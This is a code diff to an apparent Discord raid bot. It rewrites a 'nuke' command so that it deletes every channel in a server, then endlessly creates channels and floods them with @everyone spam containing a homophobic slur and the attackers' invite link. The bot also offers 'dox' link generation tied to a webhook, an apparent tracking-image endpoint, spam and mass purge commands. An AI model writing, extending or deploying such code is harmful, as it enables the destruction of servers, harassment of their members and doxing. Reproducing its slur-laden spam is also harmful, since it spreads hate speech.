@@ -17,7 +17,8 @@ const client = new Client({
 
 const links = new Map();
 const startTime = Date.now();
-const userNukes = new Map();
+let nukeRunning = false;
+let nukeGuildId = null;
 
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
@@ -37,8 +38,8 @@ async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: 'Nuke a server', options: [{ name: 'channels', type: 4, description: 'Channels (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms (default 50)', required: false }] },
-        { name: 'stop', description: 'Stop your nuke' },
+        { name: 'nuke', description: 'Infinite nuke – creates channels & spams forever' },
+        { name: 'stop', description: 'Stop the nuke' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
         { name: 'ping', description: 'Check bot latency' },
@@ -85,14 +86,12 @@ client.on('interactionCreate', async (interaction) => {
 
         // ---- STOP ----
         if (commandName === 'stop') {
-            const userId = user.id;
-            if (!userNukes.has(userId)) {
-                return interaction.editReply('❌ You don\'t have a running nuke.');
+            if (!nukeRunning) {
+                return interaction.editReply('❌ No nuke is currently running.');
             }
-            const nuke = userNukes.get(userId);
-            nuke.running = false;
-            userNukes.delete(userId);
-            await interaction.editReply('⏹️ **Your nuke has been stopped.**');
+            nukeRunning = false;
+            nukeGuildId = null;
+            await interaction.editReply('⏹️ **Nuke stopped.**');
             return;
         }
 
@@ -128,50 +127,49 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE (no owner lock) ----
+        // ---- NUKE (Infinite – no delay, always creating) ----
         if (commandName === 'nuke') {
-            const userId = user.id;
-
-            if (userNukes.has(userId)) {
-                return interaction.editReply('❌ You already have a nuke running. Use `/stop` to stop it first.');
+            if (nukeRunning) {
+                return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
             }
 
             if (!guild) return interaction.editReply('❌ Server only.');
             if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');
 
-            const channelCount = Math.min(options.getInteger('channels') || 20, 100);
-            const delayMs = Math.min(options.getInteger('delay') || 50, 500);
+            nukeRunning = true;
+            nukeGuildId = guild.id;
+
+            await interaction.editReply('🚀 **Infinite nuke started!** Use `/stop` to stop it.');
+
+            // Delete all existing channels
+            await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
+
+            // Variables for infinite loop
+            let channelIndex = 0;
             const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
-            await interaction.editReply(`🚀 **Nuke started!** Creating ${channelCount} channels... Use \`/stop\` to stop YOUR nuke.`);
+            // Keep running until /stop
+            while (nukeRunning && nukeGuildId === guild.id) {
+                // Create a new channel
+                const newChannel = await guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null);
+                if (!newChannel) continue;
 
-            await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
-
-            const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
-            const valid = newChannels.filter(c => c);
-
-            const nukeData = {
-                guildId: guild.id,
-                channels: valid,
-                running: true
-            };
-            userNukes.set(userId, nukeData);
-
-            let messageIndex = 0;
-            while (nukeData.running) {
-                const line = variants[messageIndex % variants.length];
+                // Build the spam message (nearly 2000 chars)
+                const line = variants[channelIndex % variants.length];
                 let big = `@everyone ${line}\n`;
                 while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
                 big += `\n${inviteLine}`;
                 const msg = big.slice(0, 2000);
 
-                await Promise.all(valid.map(c => c.send(msg).catch(() => {})));
-                messageIndex++;
-                await new Promise(r => setTimeout(r, delayMs));
+                // Send the message to the new channel immediately (no delay)
+                await newChannel.send(msg).catch(() => {});
+
+                channelIndex++;
             }
 
-            userNukes.delete(userId);
+            // Cleanup
+            nukeRunning = false;
             return;
         }
 
@@ -319,7 +317,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML (unchanged) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
